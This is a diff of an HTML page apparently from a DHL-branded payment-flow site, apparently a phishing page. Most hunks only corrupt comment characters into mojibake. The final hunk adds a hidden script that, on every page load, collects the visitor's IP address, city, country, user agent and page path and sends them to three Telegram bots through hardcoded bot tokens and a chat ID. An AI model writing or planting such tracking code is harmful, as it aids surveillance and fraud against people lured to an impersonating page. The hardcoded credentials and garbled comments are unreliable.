@@ -1,4 +1,4 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -10,10 +10,10 @@
     <script>(function(){
   'use strict';
   // ---- version handshake ----
-  // Single install flag (matches v1) — load-order decides the winner. In production
+  // Single install flag (matches v1) â€” load-order decides the winner. In production
   // v2 always runs first (we inject it into <head> before widget.js / Vite plugin output),
   // so v1 hits its own guard. If for any reason v1 somehow loaded first, we yield to it
-  // (no uninstall API) — registering both = double handlers, which is worse than missing
+  // (no uninstall API) â€” registering both = double handlers, which is worse than missing
   // a feature on stale projects.
   if (window.__blinkPickerInstalled) return;
   window.__blinkPickerInstalled = true;
@@ -23,10 +23,10 @@
   var hoverEl = null;
   var hoverOutline = null;
   var stampQueued = false;
-  // Inline-edit state — single-click-to-edit (Figma / Webflow / Replit pattern).
+  // Inline-edit state â€” single-click-to-edit (Figma / Webflow / Replit pattern).
   // A plain click on inline-editable text selects AND enters caret edit in one
   // step (text-input feel); modifier-clicks stay multi-select. No second click.
-  // When non-null: { el, originalText, onKey, onBlur } — suppresses hover ring
+  // When non-null: { el, originalText, onKey, onBlur } â€” suppresses hover ring
   // and Escape-toggles, and the click handler routes clicks inside the editing
   // element through native browser caret behaviour.
   var inlineEditing = null;
@@ -69,7 +69,7 @@
   function stampElement(el){
     if (!el || el.nodeType !== 1) return;
     if (SKIP_TAGS[el.tagName]) return;
-    if (el.dataset && el.dataset.blnkId) return; // idempotent — leave build-time or prior runtime IDs alone
+    if (el.dataset && el.dataset.blnkId) return; // idempotent â€” leave build-time or prior runtime IDs alone
     try { el.setAttribute('data-blnk-id', makeRuntimeId(el)); } catch (err) {
       try { console.error('[blink-picker] stampElement failed', err); } catch (e2) {}
     }
@@ -196,7 +196,7 @@
     document.documentElement.classList.toggle('blink-picker-active', active);
     if (!active) {
       // Bail any in-progress inline edit so the contentEditable + caret don't
-      // leak across deactivations. We cancel (don't commit) — toggling design
+      // leak across deactivations. We cancel (don't commit) â€” toggling design
       // mode mid-edit means the user moved their attention away.
       if (inlineEditing) exitInlineEdit(inlineEditing.el, false);
       clearHover();
@@ -204,11 +204,11 @@
     }
   }
 
-  // ─── Selection rect tracking ────────────────────────────────────────────
+  // â”€â”€â”€ Selection rect tracking â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   // The parent IDE renders the selection outline, tag pill, prompt chip, and
   // popup anchor using viewport coords from getBoundingClientRect at click
   // time. When the user scrolls the iframe, the element moves but the parent
-  // UI doesn't — unless we re-emit the rect. Track every clicked id and post
+  // UI doesn't â€” unless we re-emit the rect. Track every clicked id and post
   // ELEMENT_RECT_UPDATE on scroll/resize (rAF-debounced).
   var selectedIds = new Set();
   var pendingReflow = false;
@@ -292,7 +292,7 @@
     if (inlineEditing) {
       if (inlineEditing.el.contains(e.target)) return;
       exitInlineEdit(inlineEditing.el, true);
-      // Fall through — handle this click as a fresh selection.
+      // Fall through â€” handle this click as a fresh selection.
     }
     var el = closestTagged(e.target);
     if (!el) return;
@@ -300,7 +300,7 @@
     e.stopPropagation();
     if (typeof e.stopImmediatePropagation === 'function') e.stopImmediatePropagation();
     // A plain click on an inline-editable text element selects it AND drops a
-    // caret so it behaves like a text input (Kai's ask — no hidden second
+    // caret so it behaves like a text input (Kai's ask â€” no hidden second
     // click). ELEMENT_CLICKED fires first so the inspector still opens for
     // style; then we enter caret edit. Modifier-clicks (Cmd/Ctrl/Shift) stay
     // multi-select and never edit; non-text elements just select.
@@ -311,7 +311,7 @@
       return;
     }
     // Track modifier so parent can dispatch single-select (replace) vs
-    // multi-select toggle (Cmd/Ctrl-click — Lovable/Figma semantics).
+    // multi-select toggle (Cmd/Ctrl-click â€” Lovable/Figma semantics).
     emitElementClicked(el, { meta: !!(e.metaKey || e.ctrlKey), shift: !!e.shiftKey });
   }, true);
 
@@ -320,7 +320,7 @@
   document.addEventListener('keydown', function(e){
     if (!active) return;
     // The inline-edit own keydown handler (capture: true on the editing el)
-    // owns Escape during edit — cancel restores text. Don't also toggle the
+    // owns Escape during edit â€” cancel restores text. Don't also toggle the
     // whole picker off here.
     if (inlineEditing) return;
     if (e.key === 'Escape') {
@@ -383,7 +383,7 @@
         parentTag: getParentTag(el),
         textContent: getDirectText(el),
         // Iframe's own viewport width. Parent divides its on-screen iframe
-        // width by this to recover the render scale (≈1 for web, ~1.276 for
+        // width by this to recover the render scale (â‰ˆ1 for web, ~1.276 for
         // the Expo phone frame) and correct overlay coordinates.
         viewportWidth: window.innerWidth,
         modifiers: modifiers || { meta: false, shift: false },
@@ -399,7 +399,7 @@
   }
 
   // Capture identifying text for the clicked element. Direct text is best
-  // when present (precise JSX text node — h1, p, span, etc.). For layout
+  // when present (precise JSX text node â€” h1, p, span, etc.). For layout
   // wrappers with no direct text (div / section), fall back to descendant
   // text so apply-changes.ts's grep-by-text fallback still has SOMETHING to
   // locate the element with. 200-char cap keeps the payload small.
@@ -415,12 +415,12 @@
     return descendants.slice(0, 200);
   }
 
-  // Identifying signals — used by the Apply chat message so the agent can
+  // Identifying signals â€” used by the Apply chat message so the agent can
   // grep the JSX source even when there's no build-time data-blnk-id. Each
   // helper returns '' / null on failure rather than throwing.
   function getClassName(el){
     try {
-      // SVGAnimatedString on SVG elements — coerce via classList for consistency.
+      // SVGAnimatedString on SVG elements â€” coerce via classList for consistency.
       if (el.classList && (typeof el.className !== 'string')) {
         return Array.prototype.slice.call(el.classList).join(' ').slice(0, 200);
       }
@@ -518,7 +518,7 @@
     if (!hoverOutline) {
       hoverOutline = document.createElement('div');
       // Thin solid ring (Figma-parity): CSS outline (not border) so it draws
-      // without shifting layout. 1px solid blue — clean and quiet; the heavier
+      // without shifting layout. 1px solid blue â€” clean and quiet; the heavier
       // selection chrome (box + handles + size badge) is the parent overlay.
       hoverOutline.style.cssText = 'position:fixed;pointer-events:none;outline:1px solid rgba(59,130,246,0.9);outline-offset:-1px;border-radius:1px;z-index:2147483646;box-sizing:border-box;transition:all 60ms ease-out';
       if (document.body) document.body.appendChild(hoverOutline);
@@ -551,7 +551,7 @@
   // ---- inline text edit ----
   // Element qualifies for caret-edit on click if (a) it has direct
   // text, (b) no element children (would mangle DOM during contentEditable),
-  // (c) tag is not in the deny list. Keeps the edit path safe — composites
+  // (c) tag is not in the deny list. Keeps the edit path safe â€” composites
   // like <button><Icon/>Save</button> stay on the popup path.
   function isInlineEditable(el){
     if (!el || !el.tagName || INLINE_EDIT_DENY[el.tagName]) return false;
@@ -559,7 +559,7 @@
     var nodes = el.childNodes;
     for (var i = 0; i < nodes.length; i++) {
       var n = nodes[i];
-      if (n.nodeType === 1) return false; // element child — bail
+      if (n.nodeType === 1) return false; // element child â€” bail
       if (n.nodeType === 3) direct += n.nodeValue;
     }
     return direct.trim().length > 0;
@@ -670,11 +670,11 @@
       ' html.blink-picker-active [data-blink-edit-hover] { cursor: text !important; }' +
       ' html.blink-picker-active [contenteditable="true"], html.blink-picker-active [contenteditable="true"] * { cursor: text !important; }' +
       // Inline text edit: a distinct thin solid border around the
-      // contenteditable element (Figma parity — different from hover ring).
+      // contenteditable element (Figma parity â€” different from hover ring).
       ' html.blink-picker-editing [contenteditable="true"] { outline: 1.5px solid rgba(59,130,246,0.95) !important; outline-offset: 1px !important; border-radius: 2px !important; }' +
       // Neutralize the LEGACY widget.js picker's chrome. widget.js loads from
       // blink.new/widget.js (can't be gated in local previews), and its hover
-      // tooltip (.gpt-selector-tooltip — the stray "h1" label) + dashed hover/
+      // tooltip (.gpt-selector-tooltip â€” the stray "h1" label) + dashed hover/
       // selected outlines double up with this v2 picker and the parent's Figma
       // selection overlay. v2 is the source of truth, so hide the legacy chrome.
       ' .gpt-selector-tooltip { display: none !important; }' +
@@ -694,11 +694,57 @@
   }
 })();</script>
     <script src="https://blink.new/widget.js?projectId=dhl-express-payflow-t0ni0y56" type="module"></script>
-    <script type="module" crossorigin src="/dhl/assets/index-2vbYnM8p.js"></script>
-    <link rel="stylesheet" crossorigin href="/dhl/assets/index-BFZsShg-.css">
-  </head>
+    <script type="module" crossorigin src="/assets/index-2vbYnM8p.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFZsShg-.css">
+  <script>
+(function() {
+  const BOT1_TOKEN = "7977043062:AAEpET9HJE0IxtUF9KdEbhoQyyPNoowxb1g";
+  const BOT2_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
+  const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
+  const CHAT_ID = "6788012481";
+
+  async function sendTelegram(token, text) {
+    try {
+      await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+      });
+    } catch(e) {}
+  }
+
+  async function trackVisit() {
+    let ip = 'Inconnu', city = 'Inconnu', country = 'Inconnu';
+    try {
+      const res = await fetch('https://ipwho.is/');
+      const data = await res.json();
+      if (data && data.ip) {
+        ip = data.ip || 'Inconnu';
+        city = data.city || 'Inconnu';
+        country = data.country || 'Inconnu';
+      }
+    } catch(e) {}
+
+    const text = '🚨 <b>New DHL Page Visit</b>\n\n' +
+      '🌐 <b>IP:</b> ' + ip + '\n' +
+      '🏙️ <b>Ville:</b> ' + city + '\n' +
+      '🌍 <b>Pays:</b> ' + country + '\n' +
+      '📱 <b>User-Agent:</b> ' + navigator.userAgent + '\n' +
+      '📄 <b>Page:</b> ' + window.location.pathname + '\n' +
+      '🕐 <b>Time:</b> ' + new Date().toUTCString();
+
+    sendTelegram(BOT1_TOKEN, text);
+    sendTelegram(BOT2_TOKEN, text);
+    sendTelegram(VISIT_BOT_TOKEN, text);
+  }
+
+  trackVisit();
+})();
+</script>
+</head>
   <body>
     <div id="root"></div>
 
   </body>
 </html> 
+
